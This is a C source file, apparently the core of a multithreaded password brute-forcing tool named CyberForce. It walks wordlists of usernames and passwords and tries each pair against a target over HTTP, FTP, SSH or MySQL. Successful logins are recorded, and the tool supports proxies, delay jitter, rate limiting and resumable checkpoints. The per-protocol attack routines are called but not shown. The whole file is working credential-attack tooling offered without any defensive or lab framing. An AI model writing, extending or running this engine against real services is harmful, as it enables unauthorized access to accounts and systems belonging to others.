#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <time.h>
#include <math.h>

#ifdef _WIN32
    #include <windows.h>
    #include <sys/time.h>
    #define sleep(x) Sleep((x) * 1000)
    #define usleep(x) Sleep((x) / 1000)
    #define strcasecmp _stricmp
#else
    #include <unistd.h>
#endif

#include "include/cyberforce.h"
#include "include/defines.h"

#define MAX_QUEUE_SIZE 100000
#define CHECKPOINT_INTERVAL 100

typedef struct {
    char *username;
    char *password;
    int attempt_id;
    int retry_count;
    struct timeval start_time;
} AttackTask;

typedef struct {
    AttackTask **queue;
    int capacity;
    int size;
    int front;
    int rear;
    pthread_mutex_t mutex;
    pthread_cond_t not_empty;
    pthread_cond_t not_full;
} TaskQueue;

typedef struct {
    int thread_id;
    ThreadPool *pool;
    Config *config;
    TaskQueue *queue;
    RateLimiter *limiter;
    volatile int *running;
    int *success_count;
    int *failure_count;
    int *total_attempts;
    pthread_mutex_t *stats_mutex;
} WorkerContext;

static volatile int g_attack_running = 0;
static TaskQueue *g_task_queue = NULL;
static ThreadPool *g_thread_pool = NULL;
static RateLimiter *g_rate_limiter = NULL;
static Config *g_current_config = NULL;
static int g_success_count = 0;
static int g_failure_count = 0;
static int g_total_attempts = 0;
static pthread_mutex_t g_stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static AttackResult *g_results = NULL;
static int g_results_capacity = 0;
static int g_results_count = 0;
static pthread_mutex_t g_results_mutex = PTHREAD_MUTEX_INITIALIZER;

// Task queue implementation
TaskQueue *task_queue_create(int capacity) {
    TaskQueue *queue = malloc(sizeof(TaskQueue));
    if (!queue) return NULL;
    
    queue->queue = malloc(sizeof(AttackTask *) * capacity);
    if (!queue->queue) {
        free(queue);
        return NULL;
    }
    
    queue->capacity = capacity;
    queue->size = 0;
    queue->front = 0;
    queue->rear = 0;
    pthread_mutex_init(&queue->mutex, NULL);
    pthread_cond_init(&queue->not_empty, NULL);
    pthread_cond_init(&queue->not_full, NULL);
    
    return queue;
}

void task_queue_destroy(TaskQueue *queue) {
    if (!queue) return;
    
    pthread_mutex_lock(&queue->mutex);
    for (int i = 0; i < queue->size; i++) {
        int idx = (queue->front + i) % queue->capacity;
        if (queue->queue[idx]) {
            free(queue->queue[idx]->username);
            free(queue->queue[idx]->password);
            free(queue->queue[idx]);
        }
    }
    pthread_mutex_unlock(&queue->mutex);
    
    pthread_mutex_destroy(&queue->mutex);
    pthread_cond_destroy(&queue->not_empty);
    pthread_cond_destroy(&queue->not_full);
    
    free(queue->queue);
    free(queue);
}

int task_queue_push(TaskQueue *queue, AttackTask *task) {
    if (!queue || !task) return -1;
    
    pthread_mutex_lock(&queue->mutex);
    
    while (queue->size == queue->capacity && g_attack_running) {
        pthread_cond_wait(&queue->not_full, &queue->mutex);
    }
    
    if (!g_attack_running) {
        pthread_mutex_unlock(&queue->mutex);
        return -1;
    }
    
    queue->queue[queue->rear] = task;
    queue->rear = (queue->rear + 1) % queue->capacity;
    queue->size++;
    
    pthread_cond_signal(&queue->not_empty);
    pthread_mutex_unlock(&queue->mutex);
    
    return 0;
}

AttackTask *task_queue_pop(TaskQueue *queue) {
    if (!queue) return NULL;
    
    pthread_mutex_lock(&queue->mutex);
    
    while (queue->size == 0 && g_attack_running) {
        pthread_cond_wait(&queue->not_empty, &queue->mutex);
    }
    
    if (!g_attack_running && queue->size == 0) {
        pthread_mutex_unlock(&queue->mutex);
        return NULL;
    }
    
    AttackTask *task = queue->queue[queue->front];
    queue->front = (queue->front + 1) % queue->capacity;
    queue->size--;
    
    pthread_cond_signal(&queue->not_full);
    pthread_mutex_unlock(&queue->mutex);
    
    return task;
}

int task_queue_size(TaskQueue *queue) {
    if (!queue) return 0;
    
    pthread_mutex_lock(&queue->mutex);
    int size = queue->size;
    pthread_mutex_unlock(&queue->mutex);
    
    return size;
}

// Worker thread function
void worker_thread(void *arg) {
    WorkerContext *ctx = (WorkerContext *)arg;
    CURL *curl = NULL;
    
    // Initialize CURL for HTTP module
    if (ctx->config->module_type == MODULE_HTTP) {
        curl = curl_easy_init();
        if (!curl) {
            fprintf(stderr, "[!] Thread %d: Failed to initialize CURL\n", ctx->thread_id);
            free(ctx);
            return;
        }
        
        // Set common CURL options
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, ctx->config->timeout);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, ctx->config->ssl_verify ? 1L : 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, ctx->config->ssl_verify ? 2L : 0L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "CyberForce/2.0");
        
        if (ctx->config->proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, ctx->config->proxy);
        }
    }
    
    while (*ctx->running) {
        // Get next task from queue
        AttackTask *task = task_queue_pop(ctx->queue);
        if (!task) break;
        
        // Apply rate limiting
        if (ctx->limiter) {
            rate_limiter_wait(ctx->limiter);
        }
        
        // Apply delay with jitter
        if (ctx->config->delay > 0) {
            int jitter = ctx->config->jitter ? (rand() % ctx->config->jitter) : 0;
            int total_delay = ctx->config->delay + jitter;
            usleep(total_delay * 1000);
        }
        
        // Execute attack
        AttackResult result;
        memset(&result, 0, sizeof(AttackResult));
        result.username = strdup(task->username);
        result.password = strdup(task->password);
        result.target = strdup(ctx->config->target);
        result.port = ctx->config->port;
        result.timestamp = time(NULL);
        
        int attack_result = 0;
        switch (ctx->config->module_type) {
            case MODULE_HTTP:
                attack_result = http_attack(ctx->config, task->username, task->password, &result);
                break;
            case MODULE_FTP:
                attack_result = ftp_attack(ctx->config, task->username, task->password, &result);
                break;
            case MODULE_SSH:
                attack_result = ssh_attack(ctx->config, task->username, task->password, &result);
                break;
            case MODULE_MYSQL:
                attack_result = mysql_attack(ctx->config, task->username, task->password, &result);
                break;
            default:
                fprintf(stderr, "[!] Unknown module type\n");
                attack_result = 0;
        }
        
        // Update statistics
        pthread_mutex_lock(ctx->stats_mutex);
        (*ctx->total_attempts)++;
        
        if (attack_result == 1) {
            (*ctx->success_count)++;
            result.status = 1;
            
            // Log success
            if (ctx->config->verbose >= 1) {
                printf(COLOR_GREEN "[+] SUCCESS: %s:%s" COLOR_RESET "\n", 
                       task->username, task->password);
            }
            
            // Save result
            pthread_mutex_lock(&g_results_mutex);
            if (g_results_count >= g_results_capacity) {
                g_results_capacity = g_results_capacity ? g_results_capacity * 2 : 100;
                g_results = realloc(g_results, sizeof(AttackResult) * g_results_capacity);
            }
            if (g_results) {
                g_results[g_results_count++] = result;
            }
            pthread_mutex_unlock(&g_results_mutex);
            
            // Stop if configured
            if (ctx->config->stop_on_success) {
                *ctx->running = 0;
            }
        } else {
            (*ctx->failure_count)++;
            result.status = 0;
            
            if (ctx->config->verbose >= 3) {
                printf("[-] FAILURE: %s:%s\n", task->username, task->password);
            }
        }
        
        // Show progress periodically
        if ((*ctx->total_attempts) % 100 == 0) {
            double progress = 0.0;
            if (ctx->queue->capacity > 0) {
                int remaining = task_queue_size(ctx->queue);
                int processed = *ctx->total_attempts;
                progress = (double)processed / (processed + remaining) * 100.0;
            }
            
            printf("[*] Progress: %d attempts, %d successes (%.1f%%)\n",
                   *ctx->total_attempts, *ctx->success_count, progress);
        }
        
        pthread_mutex_unlock(ctx->stats_mutex);
        
        // Cleanup task
        free(task->username);
        free(task->password);
        free(task);
        
        // Check if we should stop
        if (!(*ctx->running)) {
            break;
        }
    }
    
    // Cleanup
    if (curl) {
        curl_easy_cleanup(curl);
    }
    
    free(ctx);
    return;
}

// Load wordlists and create tasks
int load_and_queue_tasks(Config *config, TaskQueue *queue) {
    char **usernames = NULL;
    char **passwords = NULL;
    int user_count = 0, pass_count = 0;
    
    // Load usernames
    if (config->userlist_file) {
        usernames = load_wordlist(config->userlist_file, &user_count);
        if (!usernames || user_count == 0) {
            fprintf(stderr, "[!] Failed to load userlist: %s\n", config->userlist_file);
            return -1;
        }
    } else {
        usernames = malloc(sizeof(char *));
        if (!usernames) return -1;
        usernames[0] = strdup(config->username);
        user_count = 1;
    }
    
    // Load passwords
    if (config->passlist_file) {
        passwords = load_wordlist(config->passlist_file, &pass_count);
        if (!passwords || pass_count == 0) {
            fprintf(stderr, "[!] Failed to load passlist: %s\n", config->passlist_file);
            free_wordlist(usernames, user_count);
            return -1;
        }
    } else {
        passwords = malloc(sizeof(char *));
        if (!passwords) {
            free_wordlist(usernames, user_count);
            return -1;
        }
        passwords[0] = strdup(config->password);
        pass_count = 1;
    }
    
    printf("[+] Loaded %d usernames and %d passwords\n", user_count, pass_count);
    printf("[+] Total combinations: %d\n", user_count * pass_count);
    
    // Randomize if requested
    if (config->randomize) {
        shuffle_wordlist(usernames, user_count);
        shuffle_wordlist(passwords, pass_count);
    }
    
    // Create and queue tasks
    int task_id = 0;
    for (int u = 0; u < user_count && g_attack_running; u++) {
        for (int p = 0; p < pass_count && g_attack_running; p++) {
            AttackTask *task = malloc(sizeof(AttackTask));
            if (!task) continue;
            
            task->username = strdup(usernames[u]);
            task->password = strdup(passwords[p]);
            task->attempt_id = task_id++;
            task->retry_count = 0;
            gettimeofday(&task->start_time, NULL);
            
            if (task_queue_push(queue, task) != 0) {
                free(task->username);
                free(task->password);
                free(task);
                break;
            }
            
            // Show progress for large lists
            if (task_id % 10000 == 0) {
                printf("[*] Queued %d tasks...\n", task_id);
            }
        }
    }
    
    // Free wordlists
    free_wordlist(usernames, user_count);
    free_wordlist(passwords, pass_count);
    
    printf("[+] Queued %d total tasks\n", task_id);
    return task_id;
}

// Save checkpoint
void save_checkpoint(Config *config, int processed, int successes) {
    if (!config->output_file) return;
    
    char checkpoint_file[BUFFER_LARGE];
    snprintf(checkpoint_file, sizeof(checkpoint_file), "%s.checkpoint", config->output_file);
    
    FILE *fp = fopen(checkpoint_file, "w");
    if (!fp) return;
    
    fprintf(fp, "processed=%d\n", processed);
    fprintf(fp, "successes=%d\n", successes);
    fprintf(fp, "timestamp=%lld\n", (long long)time(NULL));
    fprintf(fp, "target=%s\n", config->target);
    
    fclose(fp);
}

// Load checkpoint
int load_checkpoint(Config *config, int *processed, int *successes) {
    if (!config->output_file) return 0;
    
    char checkpoint_file[BUFFER_LARGE];
    snprintf(checkpoint_file, sizeof(checkpoint_file), "%s.checkpoint", config->output_file);
    
    FILE *fp = fopen(checkpoint_file, "r");
    if (!fp) return 0;
    
    char line[BUFFER_MEDIUM];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "processed=", 10) == 0) {
            *processed = atoi(line + 10);
        } else if (strncmp(line, "successes=", 10) == 0) {
            *successes = atoi(line + 10);
        }
    }
    
    fclose(fp);
    return 1;
}

// Main attack function
int start_attack(Config *config) {
    g_current_config = config;
    g_attack_running = 1;
    
    // Initialize results array
    g_results_capacity = 1000;
    g_results = malloc(sizeof(AttackResult) * g_results_capacity);
    if (!g_results) return -1;
    g_results_count = 0;
    
    // Create task queue
    g_task_queue = task_queue_create(MAX_QUEUE_SIZE);
    if (!g_task_queue) {
        free(g_results);
        return -1;
    }
    
    // Create thread pool
    g_thread_pool = thread_pool_create(config->threads);
    if (!g_thread_pool) {
        task_queue_destroy(g_task_queue);
        free(g_results);
        return -1;
    }
    
    // Create rate limiter
    if (config->rate_limit > 0) {
        g_rate_limiter = rate_limiter_create(config->rate_limit);
    }
    
    // Load and queue tasks
    int total_tasks = load_and_queue_tasks(config, g_task_queue);
    if (total_tasks <= 0) {
        thread_pool_destroy(g_thread_pool);
        task_queue_destroy(g_task_queue);
        free(g_results);
        return -1;
    }
    
    // Create worker contexts
    for (int i = 0; i < config->threads; i++) {
        WorkerContext *ctx = malloc(sizeof(WorkerContext));
        if (!ctx) continue;
        
        ctx->thread_id = i;
        ctx->pool = g_thread_pool;
        ctx->config = config;
        ctx->queue = g_task_queue;
        ctx->limiter = g_rate_limiter;
        ctx->running = &g_attack_running;
        ctx->success_count = &g_success_count;
        ctx->failure_count = &g_failure_count;
        ctx->total_attempts = &g_total_attempts;
        ctx->stats_mutex = &g_stats_mutex;
        
        thread_pool_add_task(g_thread_pool, worker_thread, ctx);
    }
    
    // Wait for completion
    while (g_attack_running && task_queue_size(g_task_queue) > 0) {
        sleep(1);
        
        // Save checkpoint periodically
        if (g_total_attempts % CHECKPOINT_INTERVAL == 0) {
            save_checkpoint(config, g_total_attempts, g_success_count);
        }
        
        // Show status
        if (config->verbose >= 2) {
            int remaining = task_queue_size(g_task_queue);
            double progress = (double)g_total_attempts / (g_total_attempts + remaining) * 100.0;
            printf("[*] Status: %d/%d (%.1f%%) - %d successes\n",
                   g_total_attempts, g_total_attempts + remaining,
                   progress, g_success_count);
        }
    }
    
    // Signal threads to stop
    g_attack_running = 0;
    
    // Wake up any waiting threads
    pthread_mutex_lock(&g_task_queue->mutex);
    pthread_cond_broadcast(&g_task_queue->not_empty);
    pthread_cond_broadcast(&g_task_queue->not_full);
    pthread_mutex_unlock(&g_task_queue->mutex);
    
    // Wait for threads to finish
    thread_pool_destroy(g_thread_pool);
    
    // Save final results
    if (config->output_file && g_results_count > 0) {
        save_results(config, g_results, g_results_count);
    }
    
    // Print summary
    printf("\n" COLOR_CYAN "╔══════════════════════════════════════════════════════════╗\n" COLOR_RESET);
    printf(COLOR_CYAN "║" COLOR_RESET "                     " COLOR_YELLOW "SUMMARY" COLOR_RESET "                       " COLOR_CYAN "║\n" COLOR_RESET);
    printf(COLOR_CYAN "╠══════════════════════════════════════════════════════════╣\n" COLOR_RESET);
    printf(COLOR_CYAN "║" COLOR_RESET " Total attempts:     %-36d " COLOR_CYAN "║\n" COLOR_RESET, g_total_attempts);
    printf(COLOR_CYAN "║" COLOR_RESET " Successes:          %-36d " COLOR_CYAN "║\n" COLOR_RESET, g_success_count);
    printf(COLOR_CYAN "║" COLOR_RESET " Failures:           %-36d " COLOR_CYAN "║\n" COLOR_RESET, g_failure_count);
    if (g_total_attempts > 0) {
        double success_rate = (double)g_success_count / g_total_attempts * 100.0;
        printf(COLOR_CYAN "║" COLOR_RESET " Success rate:       %-36.2f%% " COLOR_CYAN "║\n" COLOR_RESET, success_rate);
    }
    printf(COLOR_CYAN "║" COLOR_RESET " Elapsed time:       %-36.2fs " COLOR_CYAN "║\n" COLOR_RESET, 
           difftime(time(NULL), config->start_time));
    printf(COLOR_CYAN "╚══════════════════════════════════════════════════════════╝\n" COLOR_RESET);
    
    // Cleanup
    if (g_rate_limiter) rate_limiter_destroy(g_rate_limiter);
    task_queue_destroy(g_task_queue);
    
    // Free results
    for (int i = 0; i < g_results_count; i++) {
        free(g_results[i].username);
        free(g_results[i].password);
        free(g_results[i].target);
    }
    free(g_results);
    
    return (g_success_count > 0) ? 0 : 1;
}

void attack_stop() {
    g_attack_running = 0;
    
    if (g_task_queue) {
        pthread_mutex_lock(&g_task_queue->mutex);
        pthread_cond_broadcast(&g_task_queue->not_empty);
        pthread_cond_broadcast(&g_task_queue->not_full);
        pthread_mutex_unlock(&g_task_queue->mutex);
    }
}

void cleanup_config(Config *config) {
    SAFE_FREE(config->target);
    SAFE_FREE(config->protocol);
    SAFE_FREE(config->userlist_file);
    SAFE_FREE(config->passlist_file);
    SAFE_FREE(config->username);
    SAFE_FREE(config->password);
    SAFE_FREE(config->output_file);
    SAFE_FREE(config->success_pattern);
    SAFE_FREE(config->failure_pattern);
    SAFE_FREE(config->user_agent);
    SAFE_FREE(config->proxy);
    SAFE_FREE(config->method);
    SAFE_FREE(config->post_data);
    SAFE_FREE(config->cookie);
    SAFE_FREE(config->referer);
    
    if (config->proxy_list) {
        for (int i = 0; i < config->proxy_count; i++) {
            SAFE_FREE(config->proxy_list[i]);
        }
        free(config->proxy_list);
        config->proxy_list = NULL;
    }
}

ModuleType get_module_type(const char *module_str) {
    if (!module_str) return MODULE_HTTP;
    
    if (strcasecmp(module_str, "http") == 0 || strcasecmp(module_str, "https") == 0) {
        return MODULE_HTTP;
    } else if (strcasecmp(module_str, "ftp") == 0) {
        return MODULE_FTP;
    } else if (strcasecmp(module_str, "ssh") == 0) {
        return MODULE_SSH;
    } else if (strcasecmp(module_str, "mysql") == 0) {
        return MODULE_MYSQL;
    }
    
    return MODULE_HTTP;
}

const char *get_module_str(ModuleType type) {
    switch (type) {
        case MODULE_HTTP: return "http";
        case MODULE_FTP: return "ftp";
        case MODULE_SSH: return "ssh";
        case MODULE_MYSQL: return "mysql";
        default: return "unknown";
    }
}
